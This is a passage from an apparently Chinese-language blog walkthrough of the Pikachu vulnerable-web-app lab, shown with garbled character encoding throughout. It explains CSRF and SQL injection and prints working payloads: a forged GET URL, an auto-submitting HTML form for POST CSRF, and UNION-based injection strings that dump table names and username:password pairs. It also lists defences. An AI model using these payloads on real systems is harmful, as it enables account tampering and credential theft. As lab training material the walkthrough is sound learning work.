clickâ€æ”»å‡»ã€‚å¾ˆå¤šäººæä¸æ¸…æ¥šCSRFçš„æ¦‚å¿µï¼Œç”šè‡³æœ‰æ—¶å€™ä¼šå°†å…¶å’ŒXSSæ··æ·†,æ›´æœ‰ç”šè€…ä¼šå°†å…¶å’Œè¶Šæƒé—®é¢˜æ··ä¸ºä¸€è°ˆ,è¿™éƒ½æ˜¯å¯¹åŸç†æ²¡ææ¸…æ¥šå¯¼è‡´çš„ã€‚<br>è¿™é‡Œåˆ—ä¸¾ä¸€ä¸ªåœºæ™¯è§£é‡Šä¸€ä¸‹ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©ä½ ç†è§£ã€‚<br><strong>åœºæ™¯éœ€æ±‚ï¼š</strong><br>å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½åœ¨è´­ç‰©ç½‘ç«™tianxie<a href="http://www.xx.comä¸Šå¡«å†™çš„ä¼šå‘˜åœ°å€./">www.xx.comä¸Šå¡«å†™çš„ä¼šå‘˜åœ°å€ã€‚</a><br><strong>å…ˆçœ‹ä¸‹å¤§ç™½æ˜¯å¦‚ä½•ä¿®æ”¹è‡ªå·±çš„å¯†ç çš„ï¼š</strong><br>ç™»å½•â€”ä¿®æ”¹ä¼šå‘˜ä¿¡æ¯ï¼Œæäº¤è¯·æ±‚â€”ä¿®æ”¹æˆåŠŸã€‚<br>æ‰€ä»¥å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½çš„ä¿¡æ¯ï¼Œä»–éœ€è¦æ‹¥æœ‰ï¼š1ï¼Œç™»å½•æƒé™ 2ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯çš„è¯·æ±‚ã€‚<br>ä½†æ˜¯å¤§ç™½åˆä¸ä¼šæŠŠè‡ªå·±xxxç½‘ç«™çš„è´¦å·å¯†ç å‘Šè¯‰å°é»‘ï¼Œé‚£å°é»‘æ€ä¹ˆåŠï¼Ÿ<br>äºæ˜¯ä»–è‡ªå·±è·‘åˆ°<a href="http://www.xx.comä¸Šæ³¨å†Œäº†ä¸€ä¸ªè‡ªå·±çš„è´¦å·ï¼Œç„¶åä¿®æ”¹äº†ä¸€ä¸‹è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼šE-mailåœ°å€ï¼‰ï¼Œä»–å‘ç°ä¿®æ”¹çš„è¯·æ±‚æ˜¯ï¼šhttp://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change">www.xx.comä¸Šæ³¨å†Œäº†ä¸€ä¸ªè‡ªå·±çš„è´¦å·ï¼Œç„¶åä¿®æ”¹äº†ä¸€ä¸‹è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼šE-mailåœ°å€ï¼‰ï¼Œä»–å‘ç°ä¿®æ”¹çš„è¯·æ±‚æ˜¯ï¼šhttp://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change</a><br>äºæ˜¯ï¼Œä»–å®æ–½äº†è¿™æ ·ä¸€ä¸ªæ“ä½œï¼šæŠŠè¿™ä¸ªé“¾æ¥ä¼ªè£…ä¸€ä¸‹ï¼Œåœ¨å°ç™½ç™»å½•xxxç½‘ç«™åï¼Œæ¬ºéª—ä»–è¿›è¡Œç‚¹å‡»ï¼Œå°ç™½ç‚¹å‡»è¿™ä¸ªé“¾æ¥åï¼Œä¸ªäººä¿¡æ¯å°±è¢«ä¿®æ”¹äº†,å°é»‘å°±å®Œæˆäº†æ”»å‡»ç›®çš„ã€‚<br><strong>ä¸ºå•¥å°é»‘çš„æ“ä½œèƒ½å¤Ÿå®ç°å‘¢ã€‚æœ‰å¦‚ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼š</strong></p><ol><li><a href="http://www.xxx.comè¿™ä¸ªç½‘ç«™åœ¨ç”¨æˆ·ä¿®æ”¹ä¸ªäººçš„ä¿¡æ¯æ—¶æ²¡æœ‰è¿‡å¤šçš„æ ¡éªŒ,å¯¼è‡´è¿™ä¸ªè¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ /">www.xxx.comè¿™ä¸ªç½‘ç«™åœ¨ç”¨æˆ·ä¿®æ”¹ä¸ªäººçš„ä¿¡æ¯æ—¶æ²¡æœ‰è¿‡å¤šçš„æ ¡éªŒï¼Œå¯¼è‡´è¿™ä¸ªè¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ </a>;<br>â€”å› æ­¤ï¼Œæˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨CSRFæ¼æ´ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­å…¶å¯¹å…³é”®ä¿¡æ¯ï¼ˆæ¯”å¦‚å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ï¼‰çš„æ“ä½œ(å¢åˆ æ”¹)æ˜¯å¦å®¹æ˜“è¢«ä¼ªé€ ã€‚</li><li>å°ç™½ç‚¹å‡»äº†å°é»‘å‘ç»™çš„é“¾æ¥ï¼Œå¹¶ä¸”è¿™ä¸ªæ—¶å€™å°ç™½åˆšå¥½ç™»å½•åœ¨è´­ç‰©ç½‘ä¸Š;<br>â€”å¦‚æœå°ç™½å®‰å…¨æ„è¯†é«˜ï¼Œä¸ç‚¹å‡»ä¸æ˜é“¾æ¥ï¼Œåˆ™æ”»å‡»ä¸ä¼šæˆåŠŸï¼Œåˆæˆ–è€…å³ä½¿å°ç™½ç‚¹å‡»äº†é“¾æ¥ï¼Œä½†å°ç™½æ­¤æ—¶å¹¶æ²¡æœ‰ç™»å½•è´­ç‰©ç½‘ç«™ï¼Œä¹Ÿä¸ä¼šæˆåŠŸã€‚<br>â€”å› æ­¤ï¼Œè¦æˆåŠŸå®æ–½ä¸€æ¬¡CSRFæ”»å‡»ï¼Œéœ€è¦â€œå¤©æ—¶ï¼Œåœ°åˆ©ï¼Œäººå’Œâ€çš„æ¡ä»¶ã€‚<br>å½“ç„¶ï¼Œå¦‚æœå°é»‘äº‹å…ˆåœ¨xxxç½‘çš„é¦–é¡µå¦‚æœå‘ç°äº†ä¸€ä¸ªXSSæ¼æ´ï¼Œåˆ™å°é»‘å¯èƒ½ä¼šè¿™æ ·åšï¼šæ¬ºéª—å°ç™½è®¿é—®åŸ‹ä¼äº†XSSè„šæœ¬ï¼ˆç›—å–cookieçš„è„šæœ¬ï¼‰çš„é¡µé¢ï¼Œå°ç™½ä¸­æ‹›ï¼Œå°é»‘æ‹¿åˆ°å°ç™½çš„cookieï¼Œç„¶åå°é»‘é¡ºåˆ©ç™»å½•åˆ°å°ç™½çš„åå°ï¼Œå°é»‘è‡ªå·±ä¿®æ”¹å°ç™½çš„ç›¸å…³ä¿¡æ¯ã€‚<br> â€”æ‰€ä»¥è·Ÿä¸Šé¢æ¯”ä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹å‡ºCSRFä¸XSSçš„åŒºåˆ«ï¼šCSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´åã€‚å› æ­¤ï¼Œç½‘ç«™å¦‚æœè¦é˜²æ­¢CSRFæ”»å‡»ï¼Œåˆ™éœ€è¦å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å¯¹åº”çš„å®‰å…¨æªæ–½ï¼Œé˜²æ­¢è¿™äº›æ“ä½œå‡ºç°è¢«ä¼ªé€ çš„æƒ…å†µï¼Œä»è€Œå¯¼è‡´CSRFã€‚æ¯”å¦‚ï¼š<br>â€“å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„tokenï¼›<br>â€“å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„éªŒè¯ç ï¼›<br>â€“å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å®‰å…¨çš„é€»è¾‘æµç¨‹ï¼Œæ¯”å¦‚ä¿®æ”¹å¯†ç æ—¶ï¼Œéœ€è¦å…ˆæ ¡éªŒæ—§å¯†ç ç­‰ã€‚</li></ol><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>ç™»å·ï¼Œä¿®æ”¹ä¿¡æ¯ï¼ŒæŠ“åŒ…ï¼Œè€å¥—è·¯ï¼Œå‘ç°ä¿®æ”¹çš„ä¸ªäººä¿¡æ¯ç›´æ¥æ˜¯æ‹¼æ¥åˆ° url åœ°å€é‡Œ</p><p><code>/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=13677676754&amp;add=Oklahoma+City+Thunder&amp;email=kevin%40pikachu.com&amp;submit=submit</code>ï¼Œäºæ˜¯å¯ä»¥è‡ªå·±ä¿®æ”¹ url é‡Œé¢çš„å†…å®¹ï¼Œç‚¹å‡»æ—¢å¯ä¿®æ”¹ä¿¡æ¯</p><p>payloadï¼š<code>/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=123456789&amp;add=GUET&amp;email=hanhan%40pikachu.com&amp;submit=submit</code></p><blockquote><p>ç™¾åº¦è¯´å®æˆ˜çš„æ—¶å€™å¯ä»¥æ„é€  url å‘é€ç»™å—å®³è€…ï¼Œç‚¹å‡»å³å‘é€äº† get è¯·æ±‚ä¿®æ”¹äº†è‡ªå·±çš„ä¸ªäººä¿¡æ¯</p></blockquote><p><img src="https://s1.ax1x.com/2020/09/19/wI0nfg.png"></p><p>æ”»å‡»æˆåŠŸ</p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>ç™»å·ï¼Œä¿®æ”¹ä¿¡æ¯ï¼ŒæŠ“åŒ…ï¼Œè€å¥—è·¯ï¼Œåå­—æç¤ºæ˜¯ post æ‰€ä»¥ä¿®æ”¹çš„ä¸ªäººä¿¡æ¯ç›´æ¥æ˜¯åœ¨ post è¡¨å•é‡Œï¼Œä½†æ˜¯ä¸æ‡‚æ€ä¹ˆåˆ©ç”¨ï¼Œæˆ‘è¦æ˜¯èƒ½æŠ“åˆ°äººå®¶ç”¨æˆ·è‡ªå·±ä¿®æ”¹è‡ªå·±çš„ä¸ªäººä¿¡æ¯åŒ…æˆ‘è¿˜æ”»å‡»ä¸ªé”¤å­ï¼Œç™¾åº¦è¯´&#x3D;&#x3D;æ”»å‡»è€…å¯ä»¥æ­å»ºä¸€ä¸ªç«™ç‚¹ï¼Œåœ¨ç«™ç‚¹ä¸Šåšä¸€ä¸ªè¡¨å•ï¼Œè¯±å¯¼å—å®³è€…ç‚¹å‡»è¿™ä¸ªé“¾æ¥ï¼Œå½“ç”¨æˆ·ç‚¹å‡»æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨å‘å­˜åœ¨CSRFçš„æœåŠ¡å™¨æäº¤POSTè¯·æ±‚ä¿®æ”¹ä¸ªäººä¿¡æ¯&#x3D;&#x3D;ï¼Œç›´æ¥è´´ä»£ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://www.tests.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;body&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456789&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;vince@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¯±å¯¼å—å®³è€…ç‚¹å‡»[<a href="http://www.tests.com/vul/csrf/csrfpost/post.html]%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%BB%93%E5%90%88">www.tests.com/vul/csrf/csrfpost/post.html]å°±è¡Œäº†ï¼Œå¯ä»¥ç»“åˆ</a> xss æ¥æ”»å‡»</p><p><img src="https://s1.ax1x.com/2020/09/19/wIBYDI.png"></p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>ç™»å·ï¼Œä¿®æ”¹ä¿¡æ¯ï¼ŒæŠ“åŒ…ï¼Œè€å¥—è·¯ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯ä¾æ—§æ˜¯æ‹¼æ¥åœ¨ url é‡Œé¢ï¼Œä½†æ˜¯å¤šåŠ äº†ä¸€ä¸ª token å€¼ä¸”æ¯æ¬¡æäº¤ååœ¨è¿”å›åŒ…é‡Œæœ‰æ–°çš„ token å€¼ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªæ¼æ´ç‚¹ï¼Œä½†æ˜¯æˆ‘çš„æ°´å¹³æ‰“ä¸äº†ï¼ŒçŸ¥é“æœ‰è¿™å›äº‹ï¼Œä»¥åå†å›æ¥å¡«å‘</p><blockquote><p>ä½¿ç”¨ token æ„Ÿè§‰æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é˜²å¾¡ CSRF æ”»å‡»çš„æ–¹æ³•</p></blockquote><h1 id="SQL-Inject-SQLæ³¨å…¥æ¼æ´"><a href="#SQL-Inject-SQLæ³¨å…¥æ¼æ´" class="headerlink" title="SQL-Inject(SQLæ³¨å…¥æ¼æ´)"></a>SQL-Inject(SQLæ³¨å…¥æ¼æ´)</h1><h2 id="æ¦‚è¿°-3"><a href="#æ¦‚è¿°-3" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>å“¦,SQLæ³¨å…¥æ¼æ´ï¼Œå¯æ€•çš„æ¼æ´ã€‚<br>åœ¨owaspå‘å¸ƒçš„top10æ’è¡Œæ¦œé‡Œï¼Œæ³¨å…¥æ¼æ´ä¸€ç›´æ˜¯å±å®³æ’åç¬¬ä¸€çš„æ¼æ´ï¼Œå…¶ä¸­æ³¨å…¥æ¼æ´é‡Œé¢é¦–å½“å…¶å†²çš„å°±æ˜¯æ•°æ®åº“æ³¨å…¥æ¼æ´ã€‚<br><strong>ä¸€ä¸ªä¸¥é‡çš„SQLæ³¨å…¥æ¼æ´ï¼Œå¯èƒ½ä¼šç›´æ¥å¯¼è‡´ä¸€å®¶å…¬å¸ç ´äº§ï¼</strong><br>SQLæ³¨å…¥æ¼æ´ä¸»è¦å½¢æˆçš„åŸå› æ˜¯åœ¨æ•°æ®äº¤äº’ä¸­ï¼Œå‰ç«¯çš„æ•°æ®ä¼ å…¥åˆ°åå°å¤„ç†æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„åˆ¤æ–­ï¼Œå¯¼è‡´å…¶ä¼ å…¥çš„â€œæ•°æ®â€æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­åï¼Œè¢«å½“ä½œSQLè¯­å¥çš„ä¸€éƒ¨åˆ†æ‰§è¡Œã€‚ ä»è€Œå¯¼è‡´æ•°æ®åº“å—æŸï¼ˆè¢«è„±è£¤ã€è¢«åˆ é™¤ã€ç”šè‡³æ•´ä¸ªæœåŠ¡å™¨æƒé™æ²¦é™·ï¼‰ã€‚<br>åœ¨æ„å»ºä»£ç æ—¶ï¼Œä¸€èˆ¬ä¼šä»å¦‚ä¸‹å‡ ä¸ªæ–¹é¢çš„ç­–ç•¥æ¥é˜²æ­¢SQLæ³¨å…¥æ¼æ´ï¼š</p><ol><li>å¯¹ä¼ è¿›SQLè¯­å¥é‡Œé¢çš„å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å±é™©å­—ç¬¦ä¼ å…¥ï¼›</li><li>ä½¿ç”¨å‚æ•°åŒ–ï¼ˆParameterized Query æˆ– Parameterized Statementï¼‰ï¼›</li><li>è¿˜æœ‰å°±æ˜¯,ç›®å‰æœ‰å¾ˆå¤šORMæ¡†æ¶ä¼šè‡ªåŠ¨ä½¿ç”¨å‚æ•°åŒ–è§£å†³æ³¨å…¥é—®é¢˜,ä½†å…¶ä¹Ÿæä¾›äº†â€æ‹¼æ¥â€çš„æ–¹å¼,æ‰€ä»¥ä½¿ç”¨æ—¶éœ€è¦æ…é‡!<br>SQLæ³¨å…¥åœ¨ç½‘ç»œä¸Šéå¸¸çƒ­é—¨ï¼Œä¹Ÿæœ‰å¾ˆå¤šæŠ€æœ¯ä¸“å®¶å†™è¿‡éå¸¸è¯¦ç»†çš„å…³äºSQLæ³¨å…¥æ¼æ´çš„æ–‡ç« ï¼Œè¿™é‡Œå°±ä¸åœ¨å¤šå†™äº†ã€‚</li></ol><h2 id="æ•°å­—å‹æ³¨å…¥-post"><a href="#æ•°å­—å‹æ³¨å…¥-post" class="headerlink" title="æ•°å­—å‹æ³¨å…¥(post)"></a>æ•°å­—å‹æ³¨å…¥(post)</h2><p>æŠ“åŒ…ï¼Œé‡æ”¾</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 order by 3# æŠ±é”™Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;</span><br><span class="line">1 order by 2# æ­£å¸¸å›æ˜¾ï¼Œçˆ†å­—æ®µåˆ—æ•°ä¸º2</span><br><span class="line">1 union select database()ï¼Œuser()# å¾—åˆ°å›æ˜¾hello,pikachu &lt;br /&gt;your email is: root@localhostï¼Œå³çˆ†æ•°æ®åº“åä¸ºpikachuå’Œæ•°æ®åº“ç”¨æˆ·ä¸ºroot@localhost</span><br><span class="line">1 union select table_name,2 from information_schema.tables where table_schema = database()# çˆ†æ•°æ®è¡¨</span><br><span class="line">id=1 union select database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;# çˆ†å­—æ®µ</span><br><span class="line">id=1 union select database(),group_concat(username,&#x27;:&#x27;,password) from users# çˆ†å†…å®¹</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/19/wITob6.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/wITIDx.png"></p><p><img src="https://s1.ax1x.com/2020/09/21/w7oHMj.png"></p><p><img src="https://s1.ax1x.com/2020/09/21/w7oTzQ.png"></p><h2 id="å­—ç¬¦å‹æ³¨å…¥-get"><a href="#å­—ç¬¦å‹æ³¨å…¥-get" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥(get)"></a>å­—ç¬¦å‹æ³¨å…¥(get)</h2><p>è¾“å…¥ kobe å‘ç°æœ‰å›æ˜¾ï¼Œç»“åˆå­—ç¬¦å‹æ³¨å…¥åŸç†å¯ä»¥æ„é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; or 1=1#</span><br><span class="line"># â€™é—­åˆæ‰å‰é¢çš„å•å¼•å·ï¼Œ#æ³¨é‡Šæ‰åé¢çš„å•å¼•å·</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/21/w7ooRg.png"></p><blockquote><p>å­—ç¬¦å‹æ³¨å…¥åŸç†ï¼Œè¿™ä¸ªä¸€å¼€å§‹å­¦sqlæ³¨å…¥è€æ˜¯è½¬ä¸è¿‡å¼¯ï¼Œç°åœ¨ç†è§£äº†</p><p>æ³¨å…¥ç‚¹å°±æ˜¯$_GET[â€˜idâ€™]ï¼Œä¼ è¿›å»çš„å‚æ•°æ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œå‰åéƒ½æ˜¯æœ‰å•å¼•å·åŒ…è£¹çš„ï¼Œæ¯”å¦‚ä¼ è¿›å» <code>C1everF0x&#39; or 1=1#</code>ï¼Œç»“æœå°±æ˜¯ <code>&#39;C1everF0x&#39; or 1=1#&#39;</code>ï¼Œå‰ä¸€ä¸ªå•å¼•å· â€™ é—­åˆæ‰å‰é¢çš„å•å¼•å·çš„æ„æ€å°±æ˜¯ C1everF0x è¢«å‰é¢è‡ªå¸¦çš„å•å¼•å·å’Œåé¢ payload æ·»åŠ çš„å•å¼•å·æ³¨é‡Šæ‰äº†ï¼Œ# æ³¨é‡Šæ‰åé¢çš„å•å¼•å·çš„æ„æ€å°±æ˜¯ payload é‡Œé¢ä¼ è¿›å»çš„ # æ³¨é‡Šæ‰äº†æœ¬æ¥ç”¨äºé—­åˆç¬¬ä¸€ä¸ªå•å¼•å·çš„å•å¼•å·ï¼ˆè¿™å¥è¯è¶…çº§ç»•ï¼Œä½†æˆ‘æ„Ÿè§‰åªèƒ½è¿™æ ·å­è¡¨è¿°äº†ï¼‰ï¼Œä¸­é—´çš„ <code>or 1=1</code> å°±æ˜¯ sql æ³¨å…¥æ”»å‡»è¯­å¥</p></blockquote><h2 id="æœç´¢å‹æ³¨å…¥"><a href="#æœç´¢å‹æ³¨å…¥" class="headerlink" title="æœç´¢å‹æ³¨å…¥"></a>æœç´¢å‹æ³¨å…¥</h2><p>å…ˆçˆ†å­—æ®µæ•°ï¼Œè¿æ°”ä¸é”™ä¸€æ¬¡çˆ†åˆ°å­—æ®µåˆ—æ•°ä¸º3ï¼Œæ¥ç€çˆ†åº“ï¼Œçˆ†è¡¨ï¼Œçˆ†å­—æ®µï¼Œçˆ†å†…å®¹ä¸€å¥—å¸¦èµ°</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; order by 3## çˆ†å­—æ®µåˆ—æ•°</span><br><span class="line">kobe&#x27; union select 1,database(),user()## çˆ†æ•°æ®åº“åå’Œç”¨æˆ·å</span><br><span class="line">kobe&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()## çˆ†æ•°æ®è¡¨</span><br><span class="line">kobe&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;## çˆ†å­—æ®µ</span><br><span class="line">kobe&#x27; union select 1,database(),group_concat(username,&#x27;:&#x27;,password) from users## çˆ†å†…å®¹</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/21/w7oIJS.png"></p><p><img src="https://s1.ax1x.com/2020/09/21/w7o5i8.png"></p><p><img src="https://s1.ax1x.com/2020/09/21/w7obss.png"></p><p><img src="https://s1.ax1x.com/2020/09/21/w7oWZt.png"></p><h2 id="xxå‹æ³¨å…¥"><a href="#xxå‹æ³¨å…¥" class="headerlink" title="xxå‹æ³¨å…¥"></a>xxå‹æ³¨å…¥</h2><blockquote><p>è¿™ä¸ªé¢˜ä¸€ä¸‹å­æ²¡ååº”è¿‡æ¥æ˜¯ä»€ä¹ˆæ„æ€ï¼Œå»çœ‹äº† wp å’Œæºç çŸ¥é“æ˜¯æŸ¥è¯¢è¯­å¥å¤šäº†<code>()</code>åŒ…è£¹ä¼ è¿›æ¥çš„å‚æ•°ï¼Œæ‰€ä»¥ç”¨åæ‹¬å·é—­åˆæ‰å‰é¢çš„æ‹¬å·ï¼Œåé¢å°±æ˜¯è€å¥—è·¯ä¸€å¥—å¸¦èµ°äº†</p></blockquote><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27;) order by 2## çˆ†å­—æ®µåˆ—æ•°</span><br><span class="line">kobe&#x27;) union select database(),user()## çˆ†æ•°æ®åº“åå’Œç”¨æˆ·å</span><br><span class="line">kobe&#x27;) union select database(),group_concat(table_name) from information_schema.tables where table_schema=database()## çˆ†æ•°æ®è¡¨</span><br><span class="line">kobe&#x27;) union select database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;## çˆ†å­—æ®µ</span><br><span class="line">kobe&#x27;) union select database(),group_concat(username,&#x27;:&#x27;,password) from users## çˆ†å†…å®¹</span><br></pre></td></tr></table></figure><blockquote><p><strong>å› ä¸ºæ‡’æ‰€ä»¥ä¸æˆªå›¾äº†</strong></p><p><strong>åœ¨å®é™…æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å½“ç„¶æ˜¯çœ‹ä¸åˆ°æºç ï¼Œæ‰€ä»¥å°±éœ€è¦æ‰‹å·¥å¤šæµ‹è¯•ï¼Œæ¯”å¦‚å•å¼•å·å’ŒåŒå¼•å·è¿™ç§ï¼Œé€šè¿‡çœ‹å›æ˜¾æŠ¥é”™åˆ¤æ–­</strong></p></blockquote><h2 id="â€œinsert-x2F-updateâ€æ³¨å…¥ï¼ˆæŠ¥é”™æ³¨å…¥ï¼‰"><a href="#â€œinsert-x2F-updateâ€æ³¨å…¥ï¼ˆæŠ¥é”™æ³¨å…¥ï¼‰" class="headerlink" title="â€œinsert&#x2F;updateâ€æ³¨å…¥ï¼ˆæŠ¥é”™æ³¨å…¥ï¼‰"></a>â€œinsert&#x2F;updateâ€æ³¨å…¥ï¼ˆæŠ¥é”™æ³¨å…¥ï¼‰</h2><blockquote><p>å½“æˆ‘ä»¬å¾€åç«¯æ•°æ®åº“ä¸­æ·»åŠ æ•°æ®ï¼ŒSQLè¯­å¥å‡ºé”™çš„æ—¶å€™å¯èƒ½å‡ºç°è¿™ä¸ªæ¼æ´</p><p>extractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„)ï¼šç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®š xml 